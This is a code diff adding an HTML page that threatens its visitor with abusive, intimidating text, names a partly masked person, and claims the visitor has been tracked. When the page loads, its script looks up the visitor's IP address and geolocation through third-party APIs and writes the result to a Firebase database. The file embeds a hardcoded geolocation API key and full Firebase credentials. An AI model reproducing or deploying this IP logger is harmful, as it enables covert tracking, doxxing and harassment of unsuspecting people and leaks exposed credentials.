@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>You have been track asshole</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/3.1.0/firebase-auth.js"></script>
+<script src="https://www.gstatic.com/firebasejs/3.1.0/firebase-database.js"></script>
+</head>
+<body>
+    <p>You have been tracked asshole, cops gonna find you</p>
+    <p>Nama: F... A....</p>
+    <p>HP: Smartfren B26D2H</p>
+    <p>Sosmed: Email, Facebook VK, ETC...</p>
+    <p>Surrender??</p>
+    <p>Your IP Address is sent to my database, please be carefull</p>
+    
+    <script>
+          $.getJSON('https://api.ipify.org?format=json', function(data){
+
+// Your callback functions like   
+
+ console.log(data.ip);
+
+});
+$.getJSON('https://api.ipgeolocation.io/ipgeo?apiKey=fbb668db9196494e9d80a735b810c6d7', function(data){
+     console.log(data)
+     console.log("Data Terkirim")
+});
+    </script>
+    <!-- The core Firebase JS SDK is always required and must be listed first -->
+<script src="https://www.gstatic.com/firebasejs/8.1.1/firebase-app.js"></script>
+ 
+<!-- TODO: Add SDKs for Firebase products that you want to use
+     https://firebase.google.com/docs/web/setup#available-libraries -->
+      
+<script src="https://www.gstatic.com/firebasejs/8.1.1/firebase-database.js"></script>
+ 
+<script>
+  // Your web app's Firebase configuration
+  var firebaseConfig = {
+    apiKey: "AIzaSyCNj49RnIItrLjo9dsb4UPx_K9YFOvDJ8M",
+          authDomain: "larisplastik-b5ebf.firebaseapp.com",
+          databaseURL: "https://larisplastik-b5ebf-default-rtdb.asia-southeast1.firebasedatabase.app",
+          projectId: "larisplastik-b5ebf",
+          storageBucket: "larisplastik-b5ebf.appspot.com",
+          messagingSenderId: "861043206455",
+          appId: "1:861043206455:web:65404bc51902ecad8012b2",
+          measurementId: "G-L51LVRMS16"
+  };
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+   
+   
+  let id = "123";
+  $.getJSON('https://api.ipgeolocation.io/ipgeo?apiKey=fbb668db9196494e9d80a735b810c6d7', function(data){
+     console.log(data)
+     console.log("Data Terkirim")
+     firebase.database().ref('UserName/').set(data,function(error) {
+                if (error) {
+                  // The write failed...
+ 
+                  console.log({error});
+                } else {
+ 
+                                        
+                    alert("success");
+                  // Data saved successfully!
+                }
+              });
+});
+   
+    
+               
+               
+               
+</script>
+</body>
+</html>
